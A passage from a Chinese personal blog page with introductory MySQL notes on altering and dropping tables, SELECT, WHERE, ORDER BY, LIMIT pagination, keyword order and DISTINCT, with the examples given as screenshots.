<h4 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h4><p><img src="https://img-blog.csdnimg.cn/6663aa56ce994af8a166136abf5dfd4f.png"></p>
<h4 id="修改表添加列"><a href="#修改表添加列" class="headerlink" title="修改表添加列"></a>修改表添加列</h4><p><img src="https://img-blog.csdnimg.cn/e83174d97fd64250923f50f26ce0d4c1.png"></p>
<h4 id="数据表插入数据"><a href="#数据表插入数据" class="headerlink" title="数据表插入数据"></a>数据表插入数据</h4><p><img src="https://img-blog.csdnimg.cn/bb540666606d4c31a04a5b815acf38ef.png"></p>
<h4 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h4><p><img src="https://img-blog.csdnimg.cn/42e4950a34a94ae0910cdb695c6e931d.png"></p>
<h3 id="查询方法"><a href="#查询方法" class="headerlink" title="查询方法"></a>查询方法</h3><h4 id="select"><a href="#select" class="headerlink" title="select"></a>select</h4><p>最基础的查询语句就是由select和from组成<br><img src="https://img-blog.csdnimg.cn/e9193b856119464aacdd947dc51e897a.png"></p>
<h5 id="字段别命名"><a href="#字段别命名" class="headerlink" title="字段别命名"></a>字段别命名</h5><p><img src="https://img-blog.csdnimg.cn/e7ee8832e641422ea7a539b254bfce8b.png"></p>
<h5 id="where"><a href="#where" class="headerlink" title="where"></a>where</h5><p>用来判断数据,筛选数据（返回结果是1为true，0为false）<br><img src="https://img-blog.csdnimg.cn/313536d8738d48ebb8d33a8b61d90b58.png"></p>
<h5 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h5><p>排序，根据某个字段进行升序或者降序排序(asc是升序,desc是降序)</p>
<p><img src="https://img-blog.csdnimg.cn/522906873b7a4c4fa423a9f2d996d023.png"></p>
<h5 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h5><p>limit子句是一种限制结果的语句，用来做数据分页的</p>
<h6 id="限制长度"><a href="#限制长度" class="headerlink" title="限制长度"></a>限制长度</h6><p><img src="https://img-blog.csdnimg.cn/28dc8da294e245e0819cbaf5b873beba.png"></p>
<h6 id="限制起始位置和长度-主要用来实现数据的分页"><a href="#限制起始位置和长度-主要用来实现数据的分页" class="headerlink" title="限制起始位置和长度(主要用来实现数据的分页)"></a>限制起始位置和长度(主要用来实现数据的分页)</h6><p>limit  起始位置,长度</p>
<p><img src="https://img-blog.csdnimg.cn/336b37f525f14ecaae490920da756406.png"></p>
<h5 id="select语句中各关键字的先后顺序"><a href="#select语句中各关键字的先后顺序" class="headerlink" title="select语句中各关键字的先后顺序"></a>select语句中各关键字的先后顺序</h5><p><u>from&gt;on&gt;join</u>(table部分——形成表)&gt;<u>where&gt;group by&gt;having + 聚合函数</u>(filter部分——过滤条件)&gt;<u>select&gt;distinct&gt;&gt;order by&gt;limit</u>(查询语句部分——展示)</p>
<h4 id="distinct"><a href="#distinct" class="headerlink" title="distinct"></a>distinct</h4><p>去重，将查询出来重复结果去除<br><img src="https://img-blog.csdnimg.cn/98c449d46fe14fe884dbb1bcecf63f41.png"><br>注：distinct关键字只能写在select子句的第一个字段前面，否则报错，若有多个字段，则只有多个字段的值都相同的情况才会被认为是重复记录，distinct才会生效</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MySQL%E5%91%BD%E4%BB%A4/" rel="tag">MySQL命令</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
  </article>
  

  
  <nav class="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2015-2022
        <i class="ri-heart-fill heart_icon"></i> John Doe
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="unevensails&#39;s blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" target="_blank" rel="noopener" href="http://shenyu-vip.lofter.com">摄影</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2019/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="Search">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>